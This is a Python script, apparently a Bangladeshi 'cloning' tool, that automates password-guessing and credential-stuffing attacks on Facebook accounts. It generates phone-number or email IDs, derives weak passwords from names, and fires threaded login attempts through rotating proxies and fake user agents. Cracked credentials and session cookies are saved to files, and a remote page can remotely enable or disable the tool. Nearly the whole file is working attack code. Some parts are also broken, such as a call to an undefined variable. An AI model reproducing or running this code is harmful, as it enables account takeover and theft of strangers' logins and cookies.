import os
import sys
import time
import requests
import uuid
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        print('\n Installing missing modules ...')
        os.system('pip install requests futures==2 > /dev/null')

from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
import requests,zlib,platform
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.09)
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
warna1 = random.choice(my_color)
warna2 = random.choice(my_color)
warna3 = random.choice(my_color)
warna4 = random.choice(my_color)
warna5 = random.choice(my_color)
warna6 = random.choice(my_color)
gy = [YELLOW,GREEN]
gyc = random.choice(gy)
def tahunng(fx):
	if len(fx)==15:
		if fx[:10] in ['1000000000']       :tahunz = '2009'
		elif fx[:9] in ['100000000']       :tahunz = '2009'
		elif fx[:8] in ['10000000']        :tahunz = '2009'
		elif fx[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:tahunz = '2009'
		elif fx[:7] in ['1000006','1000007','1000008','1000009']:tahunz = '2010'
		elif fx[:6] in ['100001']          :tahunz = '2010-2011'
		elif fx[:6] in ['100002','100003'] :tahunz = '2011-2012'
		elif fx[:6] in ['100004']          :tahunz = '2012-2013'
		elif fx[:6] in ['100005','100006'] :tahunz = '2013-2014'
		elif fx[:6] in ['100007','100008'] :tahunz = '2014-2015'
		elif fx[:6] in ['100009']          :tahunz = '2015'
		elif fx[:5] in ['10001']           :tahunz = '2015-2016'
		elif fx[:5] in ['10002']           :tahunz = '2016-2017'
		elif fx[:5] in ['10003']           :tahunz = '2018'
		elif fx[:5] in ['10004']           :tahunz = '2019'
		elif fx[:5] in ['10005']           :tahunz = '2020'
		elif fx[:5] in ['10006','10007','10008']:tahunz = '2021-2022'
		else:tahunz=''
	elif len(fx) in [9,10]:
		tahunz = '2008-2009'
	elif len(fx)==8:
		tahunz = '2007-2008'
	elif len(fx)==7:
		tahunz = '2006-2007'
	else:tahunz=''
	return tahunz
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def sawrojj(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'August','09':'September','10':'October','11':'November','12':'Devember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
	#os.system('git clone https://github.com/Hannan-404/FILE')
except Exception as e:
	print('[[\x1b[1;92mâ€¢\x1b[1;97m] [\x1b[1;96mKAVI')
prox=open('.prox.txt','r').read().splitlines()

def lo(word):
    heron = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(7):
        for x in range(len(heron)):
            sys.stdout.write(('\r{}{}').format(str(word), heron[x]))
            time.sleep(0.1)
            sys.stdout.flush()
	
def cek_apk(session,coki):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO ACTIVE APK")
	else:
		print("")
		print(f'\r{so}YOUR ACTIVE APPLICATION DETAILS :'%(H))
		for i in range(len(game)):
			print("%s%s. %s%s"%(H,i+1,game[i].replace("ACTIVE"," ACTIVE"),N))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\r{N}[{M}!{N}] SORRY THERE IS NO EXPIRED APK")
	else:
		print(f'\r ðŸŽ® %sYOUR EXPIRED APPLICATION DETAILS :'%(M))
		for i in range(len(game)):
			print("%s%s. %s%s"%(K,i+1,game[i].replace("Expired"," Expired"),N))

ugen=[]
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android 11;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='fr-fr; Redmi Note 11 Build/'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Version/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l=' Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
    aa='Mozilla/5.0 (Linux; Android 13;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
        
    aa='Mozilla/5.0 (Linux; Android 10;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
	
    aa='Mozilla/5.0 (Linux; Android 12;'
    b=random.choice(['7.0','8.1.0','9','10','11','12'])
    c=random.choice(['Redmi Note 10 Pro'])
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko)'
    h=random.randrange(80,103)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Chrome/107.0.0.0 Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
logo =("""\033[1;33;1m 

███████╗██╗  ██╗ ██████╗  █████╗ ██╗██████╗ "TM
██╔════╝██║  ██║██╔═══██╗██╔══██╗██║██╔══██╗
███████╗███████║██║   ██║███████║██║██████╔╝
╚════██║██╔══██║██║   ██║██╔══██║██║██╔══██╗
███████║██║  ██║╚██████╔╝██║  ██║██║██████╔╝
╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝╚═════╝ 

\033[1;30;1m═════════════════════════════════════════════════×SH
\033[1;33;1m [≠] Github   : https://github.com/SHOAIBAHAMED421

\033[1;33;1m [≠] Author   : [SHOAIB AHAMED]

\033[1;33;1m [≠] Facebook : "SHOAIB AHAMED"(SADI)

\033[1;33;1m [≠] Virson   : 0.2_FREE 
\033[1;30;1m═════════════════════════════════════════════════×SH

\033[1;30;1m░░░░░░░\033[1;37m╬ \033[1;37m\033[1;41m𝕀𝔽 𝕐𝕆𝕌 𝔻ℝ𝔼𝔸𝕄 𝕀𝕋 𝕐𝕆𝕌 ℂ𝔸ℕ 𝔻𝕆 𝕀𝕋\033[0m\033[1;30m ╬░░░░░░░
\033[1;37;1m______________________________________________________""")
user = []
so = '~:~'
loop = 0
oks = []
cps = []
pcp=[]

def clear():
	os.system('clear')
	print(logo)
def menu():
	os.system("clear")
	clear()
	lo("\t  \033[1;33;1mLOADING SYSTEM")
	clear()
	print ("\033[1;97m[1]\033[1;33m FILE CLONING ")
	print ("\033[1;97m[2]\033[1;33m RANDOM CLONEING")
	print ("\033[1;97m[3]\033[1;33m MY Facebook ID")
	ot = input('\n   \x1b[1;32m Choose option >>> ')
	if ot == '1':
		os.system('xdg-open')
		crack_file()
		
	if ot == '2':
		os.system('xdg-open')
		rndm()
		
	if ot == '3':
		os.system('xdg-open https://www.facebook.com/shoaibahamed421')
		menu()
		
	else:
		menu()
		
def rndm():
	user=[]
	print (f"{warna1}")
	clear()
	print(gyc)
	print ("""+_____________________________________+
| Example>: 0191 ,0182, 0173          |
+_____________________________________+
""")
	cod = input('\n INPUT YOUR SIM CODE: ')
	if len(cod) != 4:
		print("Incorrect code")
	else:
		pass
	print (f"{warna3}")
	clear()
	print(gyc)
	limit = int(input(' INPUT LIMIT: '))
	for num in range (limit):
		nm = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nm)
	print (f"{warna5}")
	clear()
	print(gyc)
	print ("Do you want to use custom password: y/n")
	csp = input('\n ENTER YES OR NO : ')
	
	sai = []
	if csp in ['y','Y','yes','Yes','1']:
		psx = int(input(" Enter Password Limit: "))
		for sa in range(psx):
			pww = input(f"{so} Enter Password: ")
			sai.append(pww)
	else:
		pass
	with ThreadPool(max_workers=30) as saimon:
		print(gyc)
		clear()
		
		ln = str(len(user))
		print(50*'_')
		print('\033[1;33;1m[🔋] TOTAL IDS: '+ln)
		print('\033[1;33;1m[🔋] YOUR SIM CODE : '+cod)
		print(50*'_')
		for nhm in user:
			uid = cod+nhm
			pwx = [uid,uid[3:],uid[0:6],uid[0:7],uid[0:8]]
			for psc in sai:
				pwx.append(psc)
			saimon.submit(c,uid,pwx,ln)
	print(50*'_')
	print('\033[1;33;1m[🔋] Crack process has been completed')
	print(50*'_')
	exit()

def mail():
	user=[]
	print (f"{warna4}")
	clear()
	print(gyc)
	first = input('\033[1;33;1m [🔋] Email FARST NAME: ')
	last = input('\033[1;33;1m[🔋] Email LAST NAME :  ')
	print (f"{warna}")
	clear()
	print(gyc)
	print (' [1] Gmail \n [2] Yahoo ')
	mnum = (input ('Enter 1 Or 2:  '))
	if '1' in mnum:
		doamin = ('@gmail.com')
	elif '2' in mnum:
		doamin = ('@yahoo.com')
	limit = int(input('[🔋]EXAMPLE: 3000, 5000, 15000, 20000\nCHOOSE CLONING LIMIT : '))
	for nmbr in range(limit):
		nm = ''.join(random.choice(string.digits) for _ in range(1,4))
		user.append(nm)
	with ThreadPool(max_workers=30) as saimon:
		print(gyc)
		clear()
		ln = str(len(user))
		print('\033[1;33;1m[🔋]TOTAL IDS: '+ln)
		print ("ID BUBBLE PRINT HOBE EMAIL CLONEING AR KARONE")
		print(50*'_')
		print("")
		for nm in user:
			uid = first+last+nm+doamin
			pwx = [first,first+last,'@@'+first+'123','@@'+first+'11','@@'+first+'1122',first+'1234',first+'1122',first+'11','@@'+first+'12345',first+'12345']
			saimon.submit(c,uid,pwx,ln)
	print(50*'_')
	print('\033[1;33;1m[🔋] Crack process has been completed')
	print(50*'_')
	exit()
import random
import string

def random_headers():
    devices = ["iPhone", "Samsung", "Nexus", "Pixel", "iPad", "Surface", "Kindle"]
    browsers = ["Safari", "Chrome", "Firefox", "Opera", "Edge", "Internet Explorer"]
    device = random.choice(devices)
    browser = random.choice(browsers)
    browser_version = str(random.randint(1,20)) + "." + str(random.randint(0,10))
    platform = random.choice(["Windows", "MacOS", "Linux", "Android"])
    user_agent = f"Mozilla/5.0 ({platform}; {device}; CPH{random.randint(1000,9999)}) AppleWebKit/537.36 (KHTML, like Gecko) {browser}/{browser_version} Mobile Safari/537.36"
    random_letters = "".join(random.choice(string.ascii_letters) for i in range(10))
    header = {
         'authority': 'm.facebook.com',
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
         'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn-IN;q=0.7,bn;q=0.6',
         'cache-control': 'max-age=0',
         'sec-ch-prefers-color-scheme': 'dark',
         'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
         'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.61"',
         'sec-ch-ua-mobile': '?0',
         'sec-ch-ua-model': '""',
         'sec-ch-ua-platform': '"Linux"',
         'sec-ch-ua-platform-version': '""',
         'sec-fetch-dest': 'document',
         'sec-fetch-mode': 'navigate',
         'sec-fetch-site': 'none',
         'sec-fetch-user': '?1',
         'upgrade-insecure-requests': '1',
         'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
}
    return header

def random_header():
    devices = ["iPhone", "Samsung", "Nexus", "Pixel", "iPad", "Surface", "Kindle"]
    browsers = ["Chromium", "Not=A?Brand"]
    platforms = ["Android", "Windows", "MacOS", "Linux"]
    
    header = {
          'authority': 'm.facebook.com',
          'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
          'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn-IN;q=0.7,bn;q=0.6',
          'cache-control': 'max-age=0',
          'sec-ch-prefers-color-scheme': 'dark',
          'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
          'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.61"',
          'sec-ch-ua-mobile': '?1',
          'sec-ch-ua-model': '"BE2013"',
          'sec-ch-ua-platform': '"Android"',
          'sec-ch-ua-platform-version': '"11.0.0"',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'none',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1',
          'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
}
    return header    
	
def random_headers():
    devices = ["iPhone", "Samsung", "Nexus", "Pixel", "iPad", "Surface", "Kindle"]
    browsers = ["Safari", "Chrome", "Firefox", "Opera", "Edge", "Internet Explorer"]
    platforms = ["Windows", "MacOS", "Linux", "Android", "iOS"]

    device = random.choice(devices)
    browser = random.choice(browsers)
    platform = random.choice(platforms)
    version = str(random.randint(1, 20)) + "." + str(random.randint(0, 10))
    sec_ch_ua = f'"{browser}";v="{version}", "Not=A?Brand";v="{random.randint(1,100)}"'
    user_agent = f'Mozilla/5.0 ({platform}; Android {random.randint(1,12)}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) {browser}/{version}.0.0.0 Mobile Safari/537.36'
    
    header = {
         'authority': 'm.facebook.com',
         'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
         'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn-IN;q=0.7,bn;q=0.6',
         'cache-control': 'max-age=0',
         'sec-ch-prefers-color-scheme': 'dark',
         'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
         'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.61"',
         'sec-ch-ua-mobile': '?0',
         'sec-ch-ua-model': '""',
         'sec-ch-ua-platform': '"Linux"',
         'sec-ch-ua-platform-version': '""',
         'sec-fetch-dest': 'document',
         'sec-fetch-mode': 'navigate',
         'sec-fetch-site': 'none',
         'sec-fetch-user': '?1',
         'upgrade-insecure-requests': '1',
         'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
}
def c(uid,pwx,ln):
    global loop
    global cps    
    global oks
    global agents
    try:
        for ps in pwx:
            session = requests.Session()
            wa = random.choice(my_color)
            sys.stdout.write(f'\r%s[SHOAIB_AHAMED] [%s/%s] [OK-%s] [CP-%s] \r'%(wa,loop,ln,len(oks),len(cps))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            
            #oo=random.choice(sss)
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = random_header()
            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            
            if 'c_user' in log_cookies:
            	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            	cid = coki[65:80]
            	print('\033[1;92mSHOAIB-OK[🥰]\033[1;92m] \033[1;92m' +cid+ ' | ' +ps+    ' |>>'+tahunng(cid))
            	print('\033[1;92m[\033[1;92m🍪\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
            	open('SHOAIB-OK.txt', 'a').write( cid+' | '+ps+'\n')
            	open('SHOAIB-coki.txt', 'a').write(coki+'\n')
            	cek_apk(session,coki)
            	oks.append(cid)
            	break
            elif 'checkpoint' in log_cookies:
            	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            	cid = coki[82:97]
            	print('\33[1;91m(SHOAIB-Cp [🥲] '+cid+ ' | ' +ps+'  |>>'+tahunng(cid))
            	open('SHOAIB-CP.txt', 'a').write( uid+' | '+ps+' \n')
            	cps.append(cid)
            	break
            else:
            	#print (random_header())
            	continue
        loop+=1
        
        #sys.stdout.write('\r%s   [SAIMON] \033[1;35m[%s/%s] \033[1;32m[OK-%s] \033[1;34m[CP-%s] \r'%(wa,loop,tl,len(oks),len(cps))),
       # sys.stdout.flush()
    except requests.exceptions.ConnectionError:
        time.sleep(10)
        pass
        
def crack_file():
	
	clear()
	o = input('\x1b[1;97m [🔋] FILE NAME : ')
	print('')
	try:lin = open(o).read().splitlines()
	except:
		print('File Not Found')
		time.sleep(2)
		menu()
	for xid in lin:
		id.append(xid)
	setting()

def setting():
	hu = '3'
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
    
	
	passwrd()
	exit()
def passwrd():
	
	clear()
	print("\x1b\033[38;5;196mUSE MOBILE DATA\033[1;37m")
	print('\x1b\033[38;5;196mTOTAL IDz : '+str(len(id)))
	print("\x1b\033[38;5;196mTURN ON/OFF FLIGHT MODE IN EVERY 5 MIN")
	sawrojj(f'-----------------------------------------------')
	with ThreadPool(max_workers=30) as saimon:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = []
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'12345')
					pwv.append(frs+'1234')
					
					
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'@123')
					pwv.append(frs+'@1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
					pwv.append(frs+'786')
					
					
				saimon.submit(crack,idf,pwv)
	print('')
	sawrojj('-----------------------------------------------')
	sawrojj('CLONING COMPLETE .......... ')
	input('CLICK ENTER TO EXIT ')
    
	
	
nam = "SHOAIB"
name = "[SHOAIB-OK]"
name1 = "[SHOAIB-CP]"


def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	sys.stdout.write(f"\r {nam} {P}{loop}{P}/{P}{len(id)}{P} OK{P}={H}{ok}{P} {'{:.0%}'.format(loop/float(len(id)))}{P} "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen)
	ses = requests.Session()
	for pw in pwv:
		try:
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\x1b[38;5;206m {name1} {idf}  {pw} {N}')     
				open('/sdcard/CP/'+cpc,'a').write(idf+' '+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{H} {name} {idf}  {pw}')
				open('/sdcard/OK/'+okc,'a').write(idf+' '+pw+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def toolscontrol():
	blo = "https://apppppapppppp"
	gr = "appp.blogspot.com/20"
	rr = "23/02/got.html"

	v = "update11"
	vv = "menu11"
	vvv = "of11"
	peo = requests.get(f"{blo}{gr}{rr}").text
	if v in peo:
		update ()
	elif vv in peo:
		menu()
	elif "of11" in peo:
		clear()
		jalan (" THIS TOOLS IS NOT WORKING PLEASE WAIT FOR NEXT UPDATE")
		time.sleep(1)
		os.system('xdg-open https://facebook.com/shoaibahamed421')
		exit()
	else:
		exit()

def update():
  
  clear()
  print (' \033[0;93mPLEASE WAIT FOR UPDATE')
  time.sleep(2)
  print ("\033[1;32m")
  os.system("git pull")
  os.system("git pull")
  os.system("git pull")
  time.sleep(3)
  print ("")
  print ('\033[1;32mUPDATE SUCCESSFUL')
  time.sleep(2)
  menu()
if __name__=='__main__':
	
	try:os.system('touch .prox.txt')
	except:pass
	toolscontrol()
